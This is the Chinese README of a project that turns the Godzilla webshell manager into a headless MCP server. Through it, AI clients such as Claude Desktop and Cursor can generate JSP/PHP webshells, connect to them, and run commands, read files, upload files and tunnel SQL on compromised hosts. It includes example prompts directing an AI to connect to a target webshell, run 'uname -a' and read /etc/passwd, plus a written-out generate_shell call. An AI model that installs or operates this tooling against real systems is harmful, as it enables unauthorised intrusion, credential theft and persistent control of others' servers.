# Godzilla-MCP Headless · 哥斯拉 MCP 无头版

把 [hkdonline/Godzilla-MCP](https://github.com/hkdonline/Godzilla-MCP)（上游改版自 [cns1rius/godzilla-mcp](https://github.com/cns1rius/godzilla-mcp)）改造成**无需启动哥斯拉 GUI 即可运行**的 MCP 服务器。

- 🔌 **两种传输**：`stdio`（Claude Desktop / Claude Code / Cursor 直接拉起，零端口）与 `HTTP/SSE`（常驻服务，任意 MCP 客户端可接入）
- 🗂 **直连你的哥斯拉数据**：与哥斯拉共用同一个 `data.db`，已保存的 Webshell 直接可用
- 🧩 **同一份 JAR 双形态**：依然可以放进哥斯拉 `shells/plugins/java/` 当插件用（菜单照常）
- 🐴 **新增 `generate_shell`**：一条调用生成 JSP / PHP 哥斯拉马
- ✅ 全链路实测：Docker Tomcat(JDK8) JSP 马与 Docker PHP 靶机均通过（生成 → 上线 → 命令执行 → 文件管理）

> 只使用你自有的 `godzilla.jar` 作为类库，**不需要、也不会启动哥斯拉主程序**。

---

## 功能一览

| 工具 | 说明 |
|---|---|
| `list_shells` | 列出哥斯拉库中所有已保存的 Webshell |
| `add_shell` | 添加一个新的 Webshell 到哥斯拉库 |
| `get_env_config` | 查看支持的 Payload 与加密方式 |
| `generate_shell` | **新增** 生成 JSP / PHP 哥斯拉马（JAVA_AES_BASE64/RAW、PHP_XOR_BASE64/RAW）|
| `get_basics_info` | 目标系统信息（OS / 主机名 / 用户 / 路径 / IP…）|
| `exec_command` | 在目标执行系统命令（Java 载荷复合命令用法见下文）|
| `list_files` | 列出目标目录 |
| `read_file` | 读取目标文件内容（Base64 返回）|
| `upload_file` | 上传文件到目标（内容 Base64）|
| `exec_sql` | 经 Webshell 隧道连接内网数据库并执行 SQL |
| `resources/list` | 已保存 Shell 的资源映射 |

协议：MCP `2024-11-05`（JSON-RPC 2.0），端点 `/mcp`（HTTP 模式）或 stdio。

---

## 下载

- **方式一（推荐）**：前往 [Releases](https://github.com/Ch1ngg/Godzilla-MCP-Headless/releases) 下载 `godzilla-mcp-1.1.0.jar`
- **方式二**：直接使用仓库内 `dist/godzilla-mcp-1.1.0.jar`
- **方式三**：克隆后自行构建（见「构建」章节）

## 依赖

| 依赖 | 说明 |
|---|---|
| JDK 8+ | 运行与构建（JDK 8 / 11 / 17 实测可运行）|
| `godzilla.jar` | 从**你自己的哥斯拉安装目录**获取；仅作类库，无需启动哥斯拉 |
| Gson 2.10.1 | 已内嵌进发布 JAR；构建时脚本会自动下载 |

---

## 安装 & 使用

### 0. 获取代码

```bash
git clone https://github.com/Ch1ngg/Godzilla-MCP-Headless.git
cd Godzilla-MCP-Headless
```

准备 `godzilla.jar`：放在任意目录即可，通过 `GZ_HOME` 环境变量指向（脚本也会自动探测 `./godzilla`、`~/Godzilla`、当前目录）。

### 1. stdio 模式（推荐：Claude Desktop / Claude Code / Cursor）

客户端拉起进程、通过标准输入输出通信：无需端口、无需常驻服务。

**Claude Desktop**：编辑 `claude_desktop_config.json`
（macOS: `~/Library/Application Support/Claude/claude_desktop_config.json`）

```json
{
  "mcpServers": {
    "godzilla": {
      "command": "/绝对路径/Godzilla-MCP-Headless/scripts/run-stdio.sh",
      "env": {
        "GZ_HOME": "/你的哥斯拉目录（含 godzilla.jar 与 data.db）"
      }
    }
  }
}
```

**Claude Code**：

```bash
claude mcp add godzilla /绝对路径/Godzilla-MCP-Headless/scripts/run-stdio.sh
```

> 如果 `godzilla.jar` / `data.db` 就在 `~/Godzilla`，连 `env` 都不用配。

### 2. HTTP 模式（常驻 / 远程接入）

```bash
./scripts/run-http.sh                  # 默认 http://127.0.0.1:5566/mcp
./scripts/run-http.sh 8899 0.0.0.0     # 自定义端口 / 绑定地址
```

MCP 客户端（url 型）：

```json
{ "mcpServers": { "godzilla": { "url": "http://127.0.0.1:5566/mcp" } } }
```

> ⚠️ HTTP 模式无鉴权（沿袭上游 1.0.12 的设计），默认绑定 `127.0.0.1`；如需对外，请自行加防火墙或反向代理鉴权。

### 3. 放回哥斯拉当插件（可选）

把 `godzilla-mcp-1.1.0.jar` 复制进哥斯拉的 `shells/plugins/java/` 目录，重启哥斯拉，在顶部菜单启动即可。同一份 JAR 会自动识别两种运行形态。

---

## 使用示例

对话式指令（AI 会自动调用对应工具）：

```
连接 http://target/shell.jsp，密码 pass123，密钥 0123456789abcdef
在目标上执行 uname -a
读取 /etc/passwd
```

生成一个 JSP 马（直接调用 `generate_shell` 工具）：

```json
{
  "name": "generate_shell",
  "arguments": {
    "cryption": "JAVA_AES_BASE64",
    "password": "pass123",
    "secretKey": "0123456789abcdef",
    "outputPath": "/tmp/shell.jsp"
  }
}
```

生成后把文件上传到目标，用同组「密码 / 密钥」连接即可：
JSP 用 `JavaDynamicPayload` + `JAVA_AES_BASE64`；PHP 用 `PhpDynamicPayload` + `PHP_XOR_BASE64`。

> 密钥说明：生成时按哥斯拉规则自动派生 `md5(secretKey)[0:16]` 写入马中，与客户端天然一致。

### `exec_command` 注意事项

Java 动态载荷的命令执行是"单进程 + 参数拆分"语义，**复合命令需要包一层 shell**（与哥斯拉 GUI 行为一致）：

```
/bin/sh -c "id; echo OK; uname -a"
```

PHP 载荷可以直接用 `;` 串联。

---

## 环境变量

| 变量 | 作用 | 默认 |
|---|---|---|
| `GZ_HOME` | godzilla.jar 所在目录 | 自动探测 `./godzilla` → `~/Godzilla` → 当前目录 |
| `MCP_WORKDIR` | data.db 工作目录（决定使用哪个数据库）| 同 `GZ_HOME` |
| `MCP_JAR` | 插件 JAR 路径 | 自动查找 `dist/`、`target/` |
| `JAVA` | java 可执行文件 | `java` |
| `MCP_PORT` / `MCP_HOST` | HTTP 模式端口 / 绑定地址 | `5566` / `127.0.0.1` |

---

## 工作原理（为什么不用启动哥斯拉）

插件真正依赖 `godzilla.jar` 的只有三块能力：

1. `core.Db` —— 读写 `data.db`（已保存的 Shell 记录与设置）；
2. `core.shell.ShellEntity` + `core.imp.Payload` —— Webshell 通信协议（AES/XOR 加密、动态载荷握手）；
3. 一个 HTTP 服务。

无头启动器（`GodzillaMcpHeadlessBootstrap`）做三件事：

1. 设置 `godzilla.mcp.headless=true` → 跳过 GUI 菜单注册（放回哥斯拉运行时该标志不存在，菜单照常注册）；
2. 调用 `ApplicationContext.init()` 扫描 payload / cryption 注册表（哥斯拉 GUI 启动时会做，无头环境需手动补齐，否则会 NPE）；
3. 启动 MCP 服务（stdio 或 HTTP）。

注意：`data.db` 是 SQLite 相对路径（`jdbc:sqlite:data.db`），**工作目录决定用哪个数据库** —— 脚本会自动切换到 `MCP_WORKDIR`。

---

## 构建

### 方式一：脚本构建（无需 Maven）

```bash
cp /path/to/你的/godzilla.jar lib/     # 仅编译需要；也可以用 GZ_HOME 指定
./scripts/build.sh
# 产物: dist/godzilla-mcp-1.1.0.jar（内嵌 Gson，单文件直接可用）
```

### 方式二：Maven

```bash
cp /path/to/你的/godzilla.jar lib/
mvn -q package
# 产物: target/godzilla-mcp-1.1.0.jar
```

---

## 自测（可选）

仓库自带冒烟测试，可对着任意授权靶机跑完整链路（add_shell → 系统信息 → 命令执行 → 文件管理）：

```bash
python3 test/smoke_test.py "http://127.0.0.1:18080/gz/shell.jsp" "pass123" "0123456789abcdef"
```

快速搭本地靶场（Docker + Tomcat，30 秒）：

```bash
mkdir -p lab
# 生成马: 让 AI 调用 generate_shell 输出到 ./lab/shell.jsp（或参考 test 说明自行生成）
docker run -d --name gz-lab -p 127.0.0.1:18080:8080 \
  -v "$PWD/lab:/usr/local/tomcat/webapps/gz" tomcat:9.0-jdk8-temurin
python3 test/smoke_test.py "http://127.0.0.1:18080/gz/shell.jsp" "pass123" "0123456789abcdef"
```

---

## 相对上游的变更（v1.1.0）

| 类型 | 内容 |
|---|---|
| 新增 | 无头启动器 + `--stdio` 传输；HTTP 模式绑定地址 / 端口参数化 |
| 新增 | `generate_shell` 工具（JSP / PHP 马生成）|
| 修复 | 无头环境缺少 `ApplicationContext.init()` 导致的 NPE |
| 修复 | `util.Log` 输出污染 stdio stdout（已隔离到 stderr）|
| 修复 | `generate_shell` 密钥派生（对齐 `md5(secretKey)[0:16]`）|
| 修复 | `read_file` 改用 `downloadFile`（原为目录枚举接口，读不到内容）|
| 工程 | 启动脚本完全可移植（无硬编码路径）；无 Maven 构建脚本；冒烟测试 |

## 常见问题

**Q: 一定要有哥斯拉安装吗？**  
A: 只需要 `godzilla.jar` 与你的 `data.db` 两个文件，不需要启动哥斯拉程序。

**Q: stdio 模式的进程看起来"退出"了？**  
A: stdio 服务器跟随客户端生命周期——客户端（如 Claude Desktop）关闭时进程退出，属正常设计。需要常驻请用 HTTP 模式。

**Q: Linux 服务器没有图形界面跑不起来？**  
A: 安装 `xvfb`（Debian/Ubuntu: `apt install xvfb`）。哥斯拉核心初始化会读取屏幕尺寸，脚本在无 `DISPLAY` 时自动改用 `xvfb-run`。

**Q: 无头运行会不会和哥斯拉 GUI 冲突？**  
A: 可以共用同一个 `data.db`（读互不影响）；避免两边同时写入（如同时 `add_shell`）。

**Q: 忘记连接密码 / 密钥了？**  
A: 在哥斯拉 GUI 中查看对应 Shell，或在下一次 `add_shell` 时由你提供。

## 致谢

- [BeichenDream/Godzilla](https://github.com/BeichenDream/Godzilla) — 哥斯拉本体
- [cns1rius/godzilla-mcp](https://github.com/cns1rius/godzilla-mcp) — MCP 插件原始版本
- [hkdonline/Godzilla-MCP](https://github.com/hkdonline/Godzilla-MCP) — 本项目的直接上游
